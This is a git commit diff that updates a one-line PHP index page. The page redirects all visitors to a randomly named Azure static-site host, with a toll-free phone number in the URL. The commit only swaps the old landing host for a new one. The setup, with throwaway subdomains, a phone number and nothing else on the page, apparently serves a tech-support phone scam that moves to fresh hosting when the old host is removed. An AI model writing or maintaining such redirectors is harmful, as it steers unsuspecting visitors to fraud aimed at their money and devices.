87a6f83c066d4eb801638be655af336f454b22ee
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-06-03 22:02:47 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://f23ewferwf34fwfdddd3w3.z5.web.core.windows.net/index.html?Aniph=1-888-881-1980");
+header("Location: https://room4rockh8we8ddushdw2.z47.web.core.windows.net/index.html?Aniph=1-888-881-1980");
 
 exit;
 ?>
